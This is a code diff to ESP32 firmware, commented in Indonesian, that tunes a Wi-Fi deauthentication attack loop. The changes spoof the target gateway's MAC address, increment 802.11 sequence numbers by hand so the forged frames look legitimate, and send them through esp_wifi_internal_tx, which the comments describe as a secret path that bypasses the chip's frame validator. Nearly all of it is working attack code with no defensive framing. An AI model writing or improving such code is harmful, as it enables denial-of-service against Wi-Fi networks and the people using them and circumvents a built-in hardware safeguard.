@@ -126,11 +126,12 @@ void loopWiFi(void * pvParameters) {
     if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
-        esp_wifi_set_mode(WIFI_MODE_APSTA); 
+        esp_wifi_set_mode(WIFI_MODE_STA); 
         esp_wifi_start();
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
         deauthUdahSetup = true;
+        delayMicroseconds(1000);
       }
 
       uint8_t gatewayMAC[6];
@@ -149,13 +150,21 @@ void loopWiFi(void * pvParameters) {
       memcpy(&pkt[10], gatewayMAC, 6);
       memcpy(&pkt[16], gatewayMAC, 6);
 
-      for (int i = 0; i < 50; i++) {
-        // --- INI JALUR GHOSTESP YANG SEBENERNYA ---
-        // Fungsi 'esp_wifi_internal_tx' ngelewatin pengecekan 'unsupport frame type'
-        // Jalur ini bypass hardware validator S3
-        esp_wifi_internal_tx(WIFI_IF_AP, pkt, 26); 
+      static uint16_t seq_counter = 0; // Taruh luar biar naik terus
+
+      for (int i = 0; i < 60; i++) {
+        // Update Sequence Number secara manual & bertahap
+        seq_counter += 0x10; // Naik 1 tiap frame (4 bit bawah itu fragment)
+        if (seq_counter > 0xFFF0) seq_counter = 0;
         
-        delayMicroseconds(200);
+        pkt[22] = seq_counter & 0xFF;
+        pkt[23] = (seq_counter >> 8) & 0xFF;
+
+        // Tembak pake jalur rahasia
+        esp_wifi_internal_tx(WIFI_IF_STA, pkt, 26); 
+        
+        // Kasih jeda dikit biar router gak 'kebanjiran' terus drop paket
+        delayMicroseconds(500); 
       }
       vTaskDelay(1 / portTICK_PERIOD_MS);
     }
